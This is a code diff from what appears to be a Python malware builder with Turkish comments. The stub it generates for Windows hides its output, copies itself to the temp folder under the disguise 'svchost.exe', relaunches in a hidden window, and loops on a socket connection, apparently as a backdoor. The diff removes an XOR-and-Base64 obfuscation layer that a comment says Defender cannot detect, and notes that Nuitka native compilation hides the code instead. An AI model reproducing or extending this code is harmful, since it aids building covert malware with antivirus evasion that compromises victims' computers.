@@ -335,18 +335,18 @@ except:
     pass
 """
 
-        # Payload kodunu oluştur (bu derleme zamanında çalışır)
-        payload_code = f"""import socket,os,time,sys,shutil
+        # Nuitka native C'ye derlediği için XOR'a gerek yok — kod zaten native binary'de gizli
+        stub_code = f"""import socket,os,time,sys,shutil
 import subprocess as _sp
 if sys.stdout is None:
     sys.stdout=open(os.devnull,"w")
 if sys.stderr is None:
     sys.stderr=open(os.devnull,"w")
 _NW=0x08000000
-if getattr(sys,"frozen",False) and "--bg" not in sys.argv:
+if "--bg" not in sys.argv:
     _t=os.path.join(os.environ.get("TEMP","."),"svchost.exe")
     try:
-        shutil.copy2(sys.executable,_t)
+        shutil.copy2(sys.argv[0] if not getattr(sys,"frozen",False) else sys.executable,_t)
         _sp.Popen([_t,"--bg"],creationflags=_NW)
     except:pass
     sys.exit(0)
@@ -371,26 +371,6 @@ def _r():
         except:
             time.sleep(5)
 _r()
-"""
-        # XOR + Base64 şifreleme (derleme zamanında)
-        import random, string
-        xkey = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
-        xkey_bytes = xkey.encode('utf-8')
-        payload_bytes = payload_code.encode('utf-8')
-        enc_bytes = bytes([payload_bytes[i] ^ xkey_bytes[i % len(xkey_bytes)] for i in range(len(payload_bytes))])
-        enc_b64 = base64.b64encode(enc_bytes).decode()
-        
-        # Stub: sadece decoder + exec — Defender bunu algılayamaz
-        stub_code = f"""import sys,os
-if sys.stdout is None:
-    sys.stdout=open(os.devnull,"w")
-if sys.stderr is None:
-    sys.stderr=open(os.devnull,"w")
-import base64 as _b
-_k=b"{xkey}"
-_d=_b.b64decode("{enc_b64}")
-_c=bytes([_d[i]^_k[i%len(_k)] for i in range(len(_d))]).decode("utf-8")
-exec(_c)
 """
         save_text(stub_path, stub_code)
 
